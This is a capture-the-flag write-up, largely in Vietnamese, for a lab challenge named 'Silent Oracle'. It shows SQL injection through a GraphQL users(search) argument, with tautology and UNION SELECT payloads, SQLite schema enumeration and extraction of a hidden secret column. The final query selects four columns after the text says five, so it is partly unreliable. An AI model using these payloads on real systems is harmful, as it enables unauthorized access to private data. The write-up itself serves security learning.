# Challenge Overview
Name: Silent Oracle \
Author: 0xV01D Team\
Description: A quiet internal directory exposes only a small public surface. The useful answers are hidden behind how the service thinks about people and roles.\
Objective: Khai thác lỗ hổng SQLi GraphQL Injection trong tham số users(search) của GraphQL để đọc cột secret bị ẩn trong bảng users và lấy flag.\
# Solution Plan
1. Trong tham số search ta chèn `' OR 1=1--` . Ta thấy kết quả trả về toàn bộ user
```json
 {
  "data": {
    "users": [
      {
        "bio": "Can read public directory entries.",
        "displayName": "Guest User",
        "id": "1",
        "role": "viewer",
        "username": "guest"
      },
      {
        "bio": "Maintains onboarding notes for new operators.",
        "displayName": "Mira Stone",
        "id": "2",
        "role": "analyst",
        "username": "mira"
      },
      {
        "bio": "Keeps legacy services alive during migrations.",
        "displayName": "Rakan Vale",
        "id": "3",
        "role": "engineer",
        "username": "rakan"
      },
      {
        "bio": "Private administrative account.",
        "displayName": "Directory Admin",
        "id": "4",
        "role": "admin",
        "username": "admin"
      }
    ]
   }
 }
```
2. Mình dùng Union select để kiểm tra số cột trong bảng (5 column)
```json
    {
        "bio": "5",
        "displayName": "3",
        "id": "1",
        "role": "4",
        "username": "2"
    }
```
3. Kiểm tra các bảng trong sqlite_master có: 
`audit_log, sqlite_sequence, users`
4. Sau khi kiểm tra schema của bảng users mình phát hiện có cột scret
```GraphQL
CREATE TABLE users (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  username TEXT NOT NULL UNIQUE,
  display_name TEXT NOT NULL,
  role TEXT NOT NULL,
  bio TEXT NOT NULL,
  secret TEXT NOT NULL
)
```
5. Lấy data cột secret thôi . Flag được hiển thị trong cột bio
```GraphQL
query {
  users(search: "' UNION SELECT id,username,display_name,secret FROM users--") {
    id
    username
    displayName
    role
    bio
  }
}
```
# Flag
~~0xV01D{7f2c9e1a-84b6-4d35-9a21-c0e6f4b8d312}~~
